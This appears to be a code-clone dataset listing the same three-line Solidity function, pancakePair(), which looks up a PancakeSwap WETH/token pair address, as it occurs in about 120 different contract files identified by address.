<source file="systems/source-code/0x508A3908572F7697CF8A13c2A95642122C3Ab43B.sol" startline="49" endline="51" pcid="2956">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0xdea8f0f40066bbc20c044729f08d3c488e4603d8.sol" startline="48" endline="50" pcid="7954">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0xc18250a3Ca19Da5214B0B7A16c788726139d0b00.sol" startline="50" endline="52" pcid="6950">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0xA84aFAFf03113A740F0572E617d5972654F0dA4F.sol" startline="48" endline="50" pcid="6145">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0x0990031433A1C58Ec2A2AFD43154bDD036BA794d.sol" startline="47" endline="49" pcid="272">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0x3063792385BB315E7016f3E4eFb0560b567DB022.sol" startline="50" endline="52" pcid="1484">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0x802684855737ba75aBF906709cD1516817Ef7C74.sol" startline="51" endline="53" pcid="4737">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0x4c143f140ee6C2E0c0f6125b3133DC67C9D95856.sol" startline="49" endline="51" pcid="2847">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0x66bc620635dd4e5bebdc135489e7cb6f660b2064.sol" startline="43" endline="45" pcid="3834">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0xB515e702728D20865AB4242D71EE961b733890Cc.sol" startline="46" endline="48" pcid="6576">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0x4d93ea7ef293ed2ca2d4cc9723f5e2c0c8e09dec.sol" startline="47" endline="49" pcid="2922">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0x441b741A92A2f35EA521918D3732D7449273EBE5.sol" startline="45" endline="47" pcid="2505">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0xdd160949e087Ef040BbFde43E454BA45dF2E8B52.sol" startline="51" endline="53" pcid="7855">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0x24F678d0E7E6Cf58d7aB828e13E7DE2EF15cDb60.sol" startline="47" endline="49" pcid="1156">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0x6123891860a51956182A48145D34179b97bE0077.sol" startline="48" endline="50" pcid="3707">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0x9a5d0F32B00BDB418D7667AE36d36eA15FDe594e.sol" startline="48" endline="50" pcid="5624">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0x865Ca5Fb63230fC0e75Ab51EB04895e3A8aD8808.sol" startline="44" endline="46" pcid="4997">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0x77b3e393d8BC4ee7a6d0afff7eDeE5c449E61852.sol" startline="48" endline="50" pcid="4486">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0x681cc758d8f73Aee9cA926845b46FAc425a9f131.sol" startline="50" endline="52" pcid="3864">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0x7B9458F6326Cfe9bD5bF3f1C8BEf266da419aC0D.sol" startline="50" endline="52" pcid="4625">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0x1b6B980b58C60aB35EeE3894Fc225E711B20f472.sol" startline="49" endline="51" pcid="854">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0x402b213C2Fbc27fBf8E127AD40Fad371dDac94a5.sol" startline="47" endline="49" pcid="2354">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0x4751AA52a743FFea38c4031e5158AcfA30347f26.sol" startline="45" endline="47" pcid="2683">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0xa724ad0C59f178C3d291081b8aE06d3d23Eb5383.sol" startline="46" endline="48" pcid="6114">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0xe30a4984a2520ddad1560292df4910f1970da26a.sol" startline="46" endline="48" pcid="8178">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0xefb888BC43e9BC7cA5312fBae0CD394Cf1A27af6.sol" startline="50" endline="52" pcid="8747">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0x2EE5459A05D2DCF76699D0A383EdAcD6e5A8Ee03.sol" startline="48" endline="50" pcid="1410">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0x8d1Ac863255DFA88B9028eC119f12ABC1062b767.sol" startline="47" endline="49" pcid="5166">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0x6301C00FADD94F10409FC62E08215253fB838F46.sol" startline="47" endline="49" pcid="3769">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0x96Cf8E9E5FD134a5D00E5471b1a0890f6945425D.sol" startline="49" endline="51" pcid="5463">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0x42549293c0df3d2eb5ef99722aab9b7228f885a3.sol" startline="48" endline="50" pcid="2444">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0x173F3b04bD4d245b0Bea67CcA11c18B062098EaF.sol" startline="49" endline="51" pcid="689">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0xA319a1815BC15922A0cCaA8A6E2Ff97DAb632239.sol" startline="47" endline="49" pcid="5874">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0x569BFe249181f42c823bEBda9799e1E65f4254B6.sol" startline="49" endline="51" pcid="3233">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0x3c36CB64F2255b3558b0056E3c2F5C025E8B7a6d.sol" startline="52" endline="54" pcid="2075">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0xea53c94ea7862c92d0f084d24551fe4f23beb463.sol" startline="46" endline="48" pcid="8479">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0x7Fc773d80e0C788c7Ed212d0e86f2CB6a61E9bB3.sol" startline="50" endline="52" pcid="4701">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0x543f7c0cC91011d96D5Bc2fF8C7C12e5c60D1b29.sol" startline="47" endline="49" pcid="3128">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0x075D3f6AcC15Caf4F8699D72Bc760A09f5842C3f.sol" startline="50" endline="52" pcid="185">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0x58f43Dc7968012f4DB78EC97A36c9998658ffCcC.sol" startline="45" endline="47" pcid="3339">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0x2e146811a317ba5Eb77209C942b186f67a65E801.sol" startline="50" endline="52" pcid="1365">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0x19a99e5BBFAE5fcF744b3C866b40e36aD15CF656.sol" startline="50" endline="52" pcid="799">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0xD779eC84BC7681f2d2c51799bCF0A362b5130044.sol" startline="47" endline="49" pcid="7693">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0x957b9B7288D04A507437a46AE069bbbeeC8F6c83.sol" startline="47" endline="49" pcid="5428">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0xe022f7a1F743C18e28ABa062FCFa0746CbaE8d32.sol" startline="46" endline="48" pcid="8014">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0xea0C5622A2E88392b1edb53e495a28491aC11fBA.sol" startline="52" endline="54" pcid="8464">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0xaeE20ec596dC23E06aaDE3A2a2C7DD37A551bde7.sol" startline="47" endline="49" pcid="6374">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0x560506f3a7e8AD0307c07ab44cd1e885bA936575.sol" startline="47" endline="49" pcid="3218">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0xe10f1b5466b361c9c8c735021A6d00CDea855763.sol" startline="49" endline="51" pcid="8086">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0xc05CA5129c0D91f039B22C3f47FD82077adA63f6.sol" startline="47" endline="49" pcid="6864">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0x2362dE6A331ca1f0f5243CE99792dbEdab68D184.sol" startline="51" endline="53" pcid="1060">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0xf49f16cd3370fB4cCD6C99e1C6F465d53fdec793.sol" startline="50" endline="52" pcid="8906">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0x249f6849814bfaeda890588e404030eccdefb1c6.sol" startline="47" endline="49" pcid="1126">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0xfb3FCa7F38fEEAD4CbC677e8Ec4f3C159410ce18.sol" startline="50" endline="52" pcid="9139">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0x46a9D15f23306E44060fb3558CDF051dD9D83FA9.sol" startline="48" endline="50" pcid="2638">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0xa149cAa78E7BdE7F564162B17fc98D47B70DA95a.sol" startline="47" endline="49" pcid="5825">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0x26aC04336C1A7ad637c1ab4578A59ce17E1d9Fd9.sol" startline="48" endline="50" pcid="1216">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0xd2944fe55ABB2E7635F040C57d5b7A656d1808A6.sol" startline="50" endline="52" pcid="7535">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0x5bf8D2aedA8ECE0373C4F0C5B28633DF3A5aB834.sol" startline="110" endline="112" pcid="3509">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0xad3CEB59d03AF61608449769c223aD55478930A9.sol" startline="48" endline="50" pcid="6274">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0x4aaFEB9864aad00D9C3e5c278788b343084fdc77.sol" startline="48" endline="50" pcid="2796">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0xfBB3b5DF228ded41b9450C535Cd115707c6456C1.sol" startline="46" endline="48" pcid="9172">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0xBf2A2Cb09E5d0714977A57C3f1e95a8682233099.sol" startline="50" endline="52" pcid="6835">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0x08f9862424E2A8F7d7BDcd2c8C33C12d6cFbd43e.sol" startline="48" endline="50" pcid="242">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0x7a2bcaf7d6d3196867f7d59160d1dd5fca05da74.sol" startline="49" endline="51" pcid="4601">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0xf35aD950b9A888FF9E9c25B9a71c19dDF57d61F4.sol" startline="50" endline="52" pcid="8861">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0x53b2517B208ee8DCEBa690d57520d7798A087D17.sol" startline="50" endline="52" pcid="3098">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0x31dD70842e7443108905d50c216F2CeDb452E80a.sol" startline="50" endline="52" pcid="1558">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0x938f386ac6101Dd112e656EdDc27C8bF32c85165.sol" startline="47" endline="49" pcid="5368">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0xAAb2332D528D2C636a3c1F47dF49472A9341149b.sol" startline="50" endline="52" pcid="6224">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0x354a08270C0c3533c0e253F50eB126ef1eE04Eb6.sol" startline="50" endline="52" pcid="1677">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0x346708D8507D3114a1fa26E7f5E11aE1ba50dF2a.sol" startline="50" endline="52" pcid="1636">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0x33F474718b13546c5A717Ff1Fbd2d8BcaB6Fdd45.sol" startline="48" endline="50" pcid="1591">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0x80243a2b6dfb564459fec3e729fda998a4b7a979.sol" startline="48" endline="50" pcid="4722">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0x0f572144eaCF6e05F6c82b764CD1c722a6b22723.sol" startline="53" endline="55" pcid="398">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0x98B84E0f85ECA20c129095886bC9330Cbe32c605.sol" startline="49" endline="51" pcid="5510">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0xDee33C0f9d5395192ec09e6d4B3753015781C26A.sol" startline="45" endline="47" pcid="7984">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0xB9D25De4DC1E03a475f12ca3aAF1aFDC2407ea8e.sol" startline="51" endline="53" pcid="6712">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0x6bd91799f767b30b1f7aeb1239b3573b2e366b49.sol" startline="47" endline="49" pcid="3951">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0x24EdaAAdB4EA4C7aa6CAe4dBB0D0a93C8F5FF180.sol" startline="46" endline="48" pcid="1141">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0x9bd2cd50d1d2b8fbfc98164672bc02314e3341b4.sol" startline="47" endline="49" pcid="5654">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0x5aa699e74fb24d7f1d04e2392df05133da7cadc7.sol" startline="50" endline="52" pcid="3421">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0x25CbbcDdc474eD95A5539C382ba6F486b2EB8D84.sol" startline="50" endline="52" pcid="1193">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0xE78A151431cC384BC2Dee2dBd5115f58b1A63D6c.sol" startline="46" endline="48" pcid="8359">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0x6d1456049210842b851a60C4ca116179658eF07a.sol" startline="48" endline="50" pcid="4011">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0x1E8203DF1f5488659b9Ff0F39366014Df7d7068D.sol" startline="48" endline="50" pcid="955">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0xA49E5b1422AB286CFC8D54E0A7CBBdb3cd5aBFdB.sol" startline="51" endline="53" pcid="5971">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0xCf60d61616a64371DF34580AcE2b13401d29C55c.sol" startline="50" endline="52" pcid="7378">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0x8236e50E0EC3178c05910A37B9CbDd98bB013A45.sol" startline="44" endline="46" pcid="4882">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0x3D4c18a96cf765104e6d70aAA8B11a26eD0e1b40.sol" startline="666" endline="668" pcid="2209">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0x887503fb56fDD4b0C97dD5ad5f01EACc4847E682.sol" startline="48" endline="50" pcid="5042">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0xd6431990d48B3E463696fdc9860f866aFEB1e370.sol" startline="50" endline="52" pcid="7661">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0x2fE58503d325203E80Ed379cE24a9AB5b5f56aEa.sol" startline="46" endline="48" pcid="1455">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0x958e1604174Ea6BD0932ca9E577f01088499897a.sol" startline="50" endline="52" pcid="5443">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0xa6AC064774bF25B7Ee251C3F051Aabf28A01DCb4.sol" startline="47" endline="49" pcid="6069">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0x8Dfec76a1104A22faAD1c7Ba7A90d9508e3eF5a7.sol" startline="46" endline="48" pcid="5196">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0x3dA0eD9Ba67D1EC0CF5fDeE7598B544BD8A1fA38.sol" startline="51" endline="53" pcid="2243">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0x35539cc6f1f1c0449474fdaaa0939893457163da.sol" startline="48" endline="50" pcid="1779">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0x116C9ACc3e70e542b1F2609868Bc4a3000797cb3.sol" startline="50" endline="52" pcid="458">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0xE34d100c26D21eA743c05A18DC0cbc5d223e69a1.sol" startline="47" endline="49" pcid="8224">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0xc41c02cd4009b81815af285ab87e4ac171b1e4d2.sol" startline="49" endline="51" pcid="7032">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0x6068BB046aaF234EEa71A9d54Dd77d76D6dF5581.sol" startline="48" endline="50" pcid="3644">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0x0fa38D4bdf91c5C3E4FB66D0125748aA0897683e.sol" startline="48" endline="50" pcid="413">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0x766d176a78F7cD88Ea86f9b18b72FF093b4e1DC9.sol" startline="50" endline="52" pcid="4412">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0x957611a96e326c3b8aEa24B545Cd84bA72Ff0A9d.sol" startline="47" endline="49" pcid="5413">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0x76F7c76B8bcb64CEBcDCd6eE7D9eA3F4A4203CF8.sol" startline="52" endline="54" pcid="4471">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0x248B4A2b9897b72994722C0e259BC1Eca38eAbf0.sol" startline="50" endline="52" pcid="1106">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0x508D2342902B5D12154dCC7485c1a80242D7AEA9.sol" startline="50" endline="52" pcid="2971">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0x492615CB4660943C014ee5950b9375912fF683B8.sol" startline="47" endline="49" pcid="2745">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0x80a2f100cb796a142faca9f6ffc31dabb0b0663f.sol" startline="48" endline="50" pcid="4788">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0x60871C6c7c923B61f77C2df7AB15879239FeD83F.sol" startline="49" endline="51" pcid="3662">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0x442ab95846d23cb78311e8726f307830163a4502.sol" startline="54" endline="56" pcid="2520">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0x0b84Fa92739e6704EEb6658AfdA59747215B496A.sol" startline="49" endline="51" pcid="302">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0x53f9c54a9Ec424790E908df9068d746F6A25DE6A.sol" startline="52" endline="54" pcid="3113">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0x46e743046dccf9ab65b8454cdf879187aab5dd49.sol" startline="51" endline="53" pcid="2653">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0xb07F1e635FbA15234B11A351Ee03Da67D11111B2.sol" startline="51" endline="53" pcid="6496">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0x52739F8b5C2bCD8290403e21463615B8B952f049.sol" startline="48" endline="50" pcid="3053">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0x2C898DEc3Fb5e548b771E1A2DA4230ea7989BFF9.sol" startline="46" endline="48" pcid="1304">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0x3f2c722fd5aedb210beaa0f6932f355c1973c94b.sol" startline="49" endline="51" pcid="2262">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0x56b05991e5ed8d0ABD6B60FabdB55e1def0864D8.sol" startline="49" endline="51" pcid="3248">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0x1E453405B5B7656ae31B7cCBb783979723244327.sol" startline="49" endline="51" pcid="936">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0x4D8c3df04Ce9B909c9FBF4347A5a3fFAdf190142.sol" startline="50" endline="52" pcid="2907">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
<source file="systems/source-code/0x81069fF4cb59B3814F5d949A957a686501da2cf5.sol" startline="46" endline="48" pcid="4822">
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
</source>
